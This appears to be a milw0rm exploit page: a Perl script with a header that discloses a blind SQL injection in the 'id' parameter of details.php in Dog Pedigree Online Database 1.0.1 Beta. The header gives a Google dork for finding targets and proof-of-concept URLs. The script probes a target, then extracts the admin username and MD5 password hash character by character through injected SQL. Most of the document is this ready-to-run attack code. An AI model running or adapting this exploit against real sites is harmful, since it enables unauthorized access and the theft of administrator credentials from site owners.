<html><head><title>Dog Pedigree Online Database 1.0.1b Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#***********************************************************************************************
#***********************************************************************************************
#**	       										      **
#**  											      **
#**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
#** [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
#**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
#**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
#   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    **
#**							                                      **
#**    											      **
#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
#**					¡PROUD TO BE SPANISH!				      **
#**											      **
#***********************************************************************************************
#***********************************************************************************************
#
#----------------------------------------------------------------------------------------------
#|       	   	     (GET var 'id') BLIND SQL INJECTION EXPLOIT		      	      |
#|--------------------------------------------------------------------------------------------|
#|                       |    Dog Pedigree Online Database v1.0.1-Beta     |		      |
#|  CMS INFORMATION:	  -------------------------------------------------	              |
#|										              |
#|--&gt;WEB: http://thewhippetarchives.net/twa_is_offline.php          	                      |
#|--&gt;DOWNLOAD: http://sourceforge.net/projects/dogarchive          	                      |
#|--&gt;DEMO: N/A   	     			    					      |
#|--&gt;CATEGORY: Genealogy								      |
#|--&gt;DESCRIPTION: This project allows to setup and maintain a database for 	 	      |
#|		collecting (dog) pedigrees. The data will actually be collected...	      |
#|--&gt;RELEASED: 2009-01-25								      |
#|											      |
#|  CMS VULNERABILITY:									      |
#|											      |
#|--&gt;TESTED ON: firefox 3								      |
#|--&gt;DORK: inurl:&quot;printable_pedigree.php&quot;				                      |
#|--&gt;CATEGORY: BLIND SQL INJECTION EXPLOIT			                              |
#|--&gt;AFFECT VERSION: &lt;= 1.0.1 Beta			 			              |
#|--&gt;Discovered Bug date: 2009-05-08							      |
#|--&gt;Reported Bug date: 2009-05-08							      |
#|--&gt;Fixed bug date: 2009-05-12								      |
#|--&gt;Info patch (v1.0.2): http://sourceforge.net/projects/dogarchive/	 		      |
#|--&gt;Author: YEnH4ckEr									      |
#|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							      |
#|--&gt;WEB/BLOG: N/A									      |
#|--&gt;COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
#|--&gt;EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		      |
#----------------------------------------------------------------------------------------------
#
#-----------
#BUG FILES:
#-----------
#
#Path --&gt; [HOME_PATH]/details.php
#Lines --&gt; 135, 237-239
#
#It contents:
#	...
#
#	$currId = $_GET['id'];
#
#	...
#
#
#$query = &quot;SELECT dog.creator, users.userId, users.username FROM dog 
#					 LEFT JOIN users ON dog.creator = users.userId WHERE id=$currId;&quot;;
#$result = mysql_query($query) or die('Query failed: ' . mysql_error());
#
#	...
#	
#------------
#CONDITIONS:
#------------
#
#
#**Exist a valid id
#
#**magic quotes=off/on
#
#
#---------------------------------------
#PROOF OF CONCEPT (BLIND SQL INJECTION):
#---------------------------------------
#
#http://[HOST]/[HOME_PATH]/details.php?id=63174+and+1=1%23  --&gt; True
#
#http://[HOST]/[HOME_PATH]/details.php?id=63174+and+1=0%23  --&gt; False
#
#
#######################################################################
#######################################################################
##*******************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
##*******************************************************************##
##-------------------------------------------------------------------##
##*******************************************************************##
## GREETZ TO: JosS, Ulises2k, J.McCray and Spanish Hack3Rs community!##
##*******************************************************************##
#######################################################################
#######################################################################
#
#-------------------EOF--INFO-------------------------------&gt;&gt;&gt;ENJOY IT!
#
use LWP::UserAgent;
use HTTP::Request;
#Subroutines
sub lw
{
	my $SO = $^O;
	my $linux = &quot;&quot;;
	if (index(lc($SO),&quot;win&quot;)!=-1){
		$linux=&quot;0&quot;;
	}else{
		$linux=&quot;1&quot;;
	}		
	if($linux){
		system(&quot;clear&quot;);
	}
	else{
		system(&quot;cls&quot;);
		system (&quot;title Dog Pedigree Online Database v1.0.1-Beta (GET var 'id') BLIND SQL Injection Exploit&quot;);
		system (&quot;color 04&quot;);
	}
}
sub request {
	my $userag = LWP::UserAgent-&gt;new;
	$userag -&gt; agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
	my $request = HTTP::Request -&gt; new(GET =&gt; $_[0]);
	my $outcode= $userag-&gt;request($request)-&gt;as_string;
	return $outcode;
}
sub helper {
	print &quot;\n\t[!-!] Dogarchive v1.0.1 Beta (GET var 'id') BLIND SQL Injection Exploit\n&quot;;
	print &quot;\t[!-!] USAGE MODE: [!-!]\n&quot;;
	print &quot;\t[!-!] perl $0 [HOST] [PATH] [id]\n&quot;;
	print &quot;\t[!-!] [HOST]: Web.\n&quot;;
	print &quot;\t[!-!] [PATH]: Home Path. Not use path= no-path\n&quot;;
	print &quot;\t[!-!] [id]: Valid id.\n&quot;;
	print &quot;\t[!-!] Example: perl $0 'www.example.es' 'dogarchive' '12545'\n&quot;; 
}
sub error {
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tWEB IS NOT VULNERABLE!\n\n&quot;;
	print &quot;\tMaybe --&gt; \n\n&quot;;
	print &quot;\t1.-Patched\n&quot;;
	print &quot;\t2.-id doesn't exist\n&quot;;
	print &quot;\t3.-it needs to change userId (Default:2252)\n\n&quot;;
	print &quot;\tEXPLOIT FAILED!\n&quot;;
	print &quot;\t-----------------------------------------------------------------\n&quot;;
}
sub testedblindsql {
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tWEB MAYBE BE VULNERABLE!\n\n&quot;;
	print &quot;\tTested Blind SQL Injection.\n&quot;;		
	print &quot;\tStarting exploit...\n&quot;; 
	print &quot;\t-----------------------------------------------------------------\n\n&quot;;
}
sub brute_length{
#User length
$exit=0;
$i=0;
while($exit==0){
	my $blindsql=$_[0].&quot;+AND+(SELECT+length(username)+FROM+users+WHERE+userId=2252)=&quot;.$i++.&quot;%23&quot;; #injected code
	$output=&amp;request($blindsql);
	if($output =~ (/\&lt;td valign=\&quot;top\&quot;\&gt;\&lt;strong\&gt;Known Offspring: \&lt;\/strong\&gt;\&lt;\/td\&gt;/)){
		$exit=1;
	}else{
		$exit=0;
	}
	#Maybe patched. This is the max length of username
	if($i&gt;100){
	&amp;error;
	exit(1);
	}
}
#Save column length
$length=$i-1;
print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
print &quot;\tLength User catched!\n&quot;;
print &quot;\tLength User: &quot;.$length.&quot;\n&quot;;
print &quot;\tBruteforcing User and Password values.\n&quot;;
print &quot;\tWait several minutes (15 o 20 minutes)...\n&quot;;
print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n\n&quot;;
return $length;
}
sub exploiting {
#Bruteforcing
$values=&quot;&quot;;
$k=1;
	$z=48;
	while(($k&lt;=$_[1]) &amp;&amp; ($z&lt;=126)){
		my $blindsql=$_[0].'+AND+ascii(substring((SELECT+'.$_[2].'+FROM+users+WHERE+userId=2252),'.$k.',1))='.$z.'%23';
		$output=&amp;request($blindsql);
		if ($output =~ (/\&lt;td valign=\&quot;top\&quot;\&gt;\&lt;strong\&gt;Known Offspring: \&lt;\/strong\&gt;\&lt;\/td\&gt;/))
		{
			$values=$values.chr($z);
			$k++;
			$z=47;
		}
#new char
	$z++; 
	}
return $values;
}
#Main
&amp;lw;
	print &quot;\t\t#########################################################\n\n&quot;;
	print &quot;\t\t#########################################################\n\n&quot;;
	print &quot;\t\t##     Dogarchive v1.0.1 Beta - BLIND SQLi Exploit     ##\n\n&quot;;
	print &quot;\t\t##                  Author: Y3nh4ck3r                  ##\n\n&quot;;
	print &quot;\t\t##         Contact:y3nh4ck3r[at]gmail[dot]com          ##\n\n&quot;;
	print &quot;\t\t##                  Proud to be Spanish!               ##\n\n&quot;;
	print &quot;\t\t#########################################################\n\n&quot;;
	print &quot;\t\t#########################################################\n\n&quot;;
#Init variables
	my $host=$ARGV[0];
	my $path=$ARGV[1];	
	my $id=$ARGV[2];
#Build the uri
#Build the uri
	if($path eq &quot;no-path&quot;){
		$finalhost=&quot;http://&quot;.$host.&quot;/details.php?id=&quot;.$id;
	}else{
		$finalhost=&quot;http://&quot;.$host.&quot;/&quot;.$path.&quot;/details.php?id=&quot;.$id;
	}
#Check all variables needed
$numArgs = $#ARGV + 1;
	if($numArgs&lt;=2) 
	{
		&amp;helper;
		exit(1);	
	}
$finalrequest = $finalhost;	
#Testing blind sql injection
$blindsql=$finalrequest.&quot;+AND+1/0%23&quot;;
$output=&amp;request($blindsql);
if ($output !~ (/\&lt;td valign=\&quot;top\&quot;\&gt;\&lt;strong\&gt;Known Offspring: \&lt;\/strong\&gt;\&lt;\/td\&gt;/))
{    
	#blind sql injection is available
	&amp;testedblindsql;
}else{ 
	#Not injectable
	&amp;error;
	exit(1); 
}
#Bruteforcing length
$length_user=&amp;brute_length($finalrequest);	
#Bruteforcing username...
$username=&amp;exploiting($finalrequest,$length_user,'username');
#Bruteforcing password...
$passhash=&amp;exploiting($finalrequest,32,'password');
#final checking (perhaps admin id is not 2252)
if((!$username) || (!$passhash)){
	&amp;error;
	exit(1);
}
print &quot;\n\t\t*************************************************\n&quot;;
print &quot;\t\t*********  EXPLOIT EXECUTED WITH SUCCESS ********\n&quot;;
print &quot;\t\t*************************************************\n\n&quot;;
print &quot;\t\tAdmin-username: &quot;.$username.&quot;\n&quot;;
print &quot;\t\tAdmin-password(md5 hash): &quot;.$passhash.&quot;\n\n&quot;;
print &quot;\n\t\t&lt;&lt;----------------------FINISH!--------------------&gt;&gt;\n\n&quot;;
print &quot;\t\t&lt;&lt;---------------Thanks to: y3hn4ck3r--------------&gt;&gt;\n\n&quot;;
print &quot;\t\t&lt;&lt;------------------------EOF----------------------&gt;&gt;\n\n&quot;;
exit(1);
#Ok...all job done

# milw0rm.com [2009-05-19]</pre></html>